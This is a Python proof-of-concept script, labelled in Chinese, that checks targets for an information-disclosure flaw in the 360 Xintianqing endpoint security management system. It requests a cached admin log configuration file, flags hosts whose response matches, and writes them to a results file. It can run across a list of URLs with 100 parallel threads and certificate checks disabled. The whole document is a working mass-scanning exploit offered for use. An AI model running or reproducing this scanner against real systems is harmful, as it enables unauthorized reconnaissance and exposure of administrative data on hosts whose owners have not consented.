import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """_____________________ 
__|__  /_  ___/_  __ \
___/_ <_  __ \_  / / /
____/ // /_/ // /_/ / 
/____/ \____/ \____/  
                      """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='360 新天擎终端安全管理系统信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res1 = requests.get(url=target+payload1,headers=headers,verify=False,timeout=10)
        if '/admin/index/list' in res1.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]不存在漏洞：{target}')
    except Exception as e:
        print(f'[!]网站异常，请手动测试：{target}')


if __name__ == '__main__':
    main()